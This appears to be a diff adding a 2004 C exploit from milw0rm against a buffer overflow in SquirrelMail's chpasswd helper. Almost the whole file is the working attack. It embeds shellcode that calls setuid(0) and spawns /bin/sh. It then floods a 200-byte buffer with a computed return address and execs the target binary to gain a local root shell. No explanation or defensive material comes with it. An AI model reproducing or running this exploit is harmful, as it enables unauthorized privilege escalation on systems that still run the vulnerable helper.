@@ -1,0 +1,62 @@
+/*
+* 0x3142-sq-chpasswd.c
+* Squirremail chpasswd buffer overflow.
+*
+* Tested on SuSE 9.
+* The bug was found by Matias Neiff <matias neiff com ar>
+* Coded by x314 <0x3142 hushmail.com>
+* (c) 2004 Copyright by x314.
+* All Rights Reserved.
+*
+* Greets: m0s krewz. 
+*
+*/
+
+#include <stdlib.h>
+
+char shellcode[]=
+"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
+"\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d"
+"\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
+"\x68";
+
+int main(int argc, char *argv[])
+{
+char *env[2] = {shellcode, NULL};
+int i;
+long ret, *addr_ptr;
+char *buffer, *ptr;
+
+buffer = malloc(200);
+
+printf("\n*** Squirremail chpasswd local root exploit by 0x3142@hushmail.com ***\n\n");
+
+if(argc != 2) {
+printf("Usage: %s <path-to-chpasswd>\n\n",argv[0]);
+exit(0);
+}
+
+ret = 0xbffffffa - strlen(shellcode) - strlen(argv[1]);
+
+// printf("Using ret = 0x%x\n\n", ret);
+
+ptr = buffer;
+addr_ptr = (long *) ptr;
+for(i=0; i < 200; i+=4)
+{
+*(addr_ptr++) = ret;
+}
+
+buffer[200-1] = 0;
+
+execle(argv[1], "chpasswd", buffer, "0x314", "m0s", 0, env);
+
+free(buffer);
+
+return 0;
+}
+
+
+
+
+// milw0rm.com [2004-04-20]
